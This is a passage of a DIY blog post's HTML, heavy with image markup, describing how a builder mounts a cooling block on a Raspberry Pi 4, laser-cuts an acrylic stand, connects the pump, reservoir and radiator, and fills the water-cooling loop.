768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Add-Standoffs-For-The-Cooling-Block.jpg 1920w"></figure>



<p>Next, I’m going to use some nylon standoff mounts for the screws which hold the cooling block bracket to screw into. I’ll hold these in place with some shorter nylon standoffs underneath the Pi.</p>



<figure><img data-attachment-id="7991" data-permalink="https://www.the-diy-life.com/put-thermal-paste-onto-cpu/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Put Thermal Paste Onto CPU" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1024x576.jpg" alt="Put Thermal Paste Onto CPU" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Put-Thermal-Paste-Onto-CPU.jpg 1920w"></figure>



<p>I’ll use some thermal paste between the CPU and the spacer and then again between the spacer and the cooling block.</p>



<figure><img data-attachment-id="7992" data-permalink="https://www.the-diy-life.com/secure-with-m3-screws/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Secure With M3 Screws" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1024x576.jpg" alt="Secure With M3 Screws" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Secure-With-M3-Screws.jpg 1920w"></figure>



<p>The acrylic bracket is then clamped down onto the CPU using some M3 x 12mm button head screws.</p>



<figure><img data-attachment-id="7993" data-permalink="https://www.the-diy-life.com/cooling-block-mounted/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Cooling Block Mounted" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1024x576.jpg" alt="Cooling Block Mounted on Water Cooled Raspberry Pi" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Cooling-Block-Mounted.jpg 1920w"></figure>



<h2>Making The Cooling Circuit Stand</h2>



<p>Now that we’ve got our cooling block mounted onto our Pi, we can start working on mounting the rest of the cooling circuit. </p>



<figure><img data-attachment-id="7994" data-permalink="https://www.the-diy-life.com/water-cooling-stand/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Water Cooling Stand" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1024x576.jpg" alt="Water Cooling Stand" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Water-Cooling-Stand.jpg 1920w"></figure>



<p>Rather than just connecting all of the components together on a desk, I decided to design a stand to mount the water cooling components and Raspberry Pi, so that it looks more complete.</p>



<p>I’m going to use clear acrylic for the stand with some fluorescent green legs to match the cooling block bracket. The water cooling components should just bolt straight onto this sheet once it’s been cut out.</p>



<figure><img data-attachment-id="7995" data-permalink="https://www.the-diy-life.com/laser-cutting-the-water-cooling-stand/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Laser Cutting The Water Cooling Stand" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1024x576.jpg" alt="Laser Cutting The Water Cooling Stand" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Laser-Cutting-The-Water-Cooling-Stand.jpg 1920w"></figure>



<p>Again, I cut this stand out on my laser cutter from 3mm acrylic, this time clear.</p>



<p>Now that we’ve got our stand components made, lets start putting them together. </p>



<figure><img data-attachment-id="7996" data-permalink="https://www.the-diy-life.com/mount-water-cooling-components-to-test-stand/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Mount Water Cooling Components To Test Stand" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1024x576.jpg" alt="Mount Water Cooling Components To Test Stand" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Water-Cooling-Components-To-Test-Stand.jpg 1920w"></figure>



<p>I’ll start by mounting the reservoir, pump and radiator onto the stand.</p>



<figure><img data-attachment-id="7997" data-permalink="https://www.the-diy-life.com/glue-raspberry-pi-stand-together/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Glue Raspberry Pi Stand Together" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1024x576.jpg" alt="Glue Raspberry Pi Stand Together" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Glue-Raspberry-Pi-Stand-Together.jpg 1920w"></figure>



<p>Next, I need to glue the Raspberry Pi stand components onto the main cooling water stand. I clamped the components in place and allowed the cement to cure for a couple of hours before trying to mount the Pi.</p>



<figure><img data-attachment-id="7998" data-permalink="https://www.the-diy-life.com/mount-pi-to-stand/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Mount Pi To Stand" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1024x576.jpg" alt="Mount Pi To Stand" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Mount-Pi-To-Stand.jpg 1920w"></figure>



<p>Once the glued had properly cured, I put two lengths of tubing onto the heat sink so that I didn’t have to try push them on in the tight space between the Pi and the pump, and then mounted the Pi onto the stand using four nylon M3 nuts on the bottom of the standoffs.</p>



<figure><img data-attachment-id="7999" data-permalink="https://www.the-diy-life.com/connect-remaining-tubing/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Connect Remaining Tubing" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1024x576.jpg" alt="Connect Remaining Tubing on Water Cooled Raspberry Pi 4" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Connect-Remaining-Tubing.jpg 1920w"></figure>



<p>I then added the fittings and finished off the tubing.</p>



<p>One side of the cooling block goes to the pump and the other to the radiator. We also need a section of tube from the radiator to the top of the reservoir.</p>



<p>The last thing to do is to add a small acrylic block to the base of the pump to hold the weight of the pump and reservoir. The legs on the stand are not strong enough to support all of the cooling components and I didn’t want to make them bigger as I like the look of the thinner sections. You’ll also hardly notice the block under the pump if it’s clear.</p>



<figure><img data-attachment-id="8000" data-permalink="https://www.the-diy-life.com/fill-up-circuit-with-cooling-water/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fill Up Circuit With Cooling Water" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1024x576.jpg" loading="lazy" width="1024" height="576" src="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1024x576.jpg" alt="Fill Up Circuit With Cooling Water" sizes="(max-width: 1024px) 100vw, 1024px" ezimgfmt="rs rscb1 src ng ngcb1 srcset" data-ezsrc="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1024x576.jpg" data-ezsrcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water.jpg 1920w" srcset="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1024x576.jpg 1024w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-300x169.jpg 300w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-768x432.jpg 768w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water-1536x864.jpg 1536w,https://www.the-diy-life.com/wp-content/uploads/2020/11/Fill-Up-Circuit-With-Cooling-Water.jpg 1920w"></figure>



<p>Our water cooled Pi is now complete, we just need to fill it up with water or cooling liquid and try it out. The system took around 300ml of cooling liquid to fill.</p>



<h2>Testing The Water Cooled Raspberry Pi 4</h2>



<p>The fan and pump are actually quite quiet when running, the system is a lot quieter than some of the small case fans I’ve used on a Raspberry Pi.</p>



<figure><img data-attachment-id="8003" data-permalink="https://www.the-diy-life.com/fan-running-on-radiator/" data-orig-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fan Running On Radiator" data-image-description="" data-medium-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-300x169.jpg" data-large-file="https://www.the-diy-life.com/wp-content/uploads/2020/11/Fan-Running-On-Radiator-1024x576.jpg" loading="lazy" width="1024" height="576" 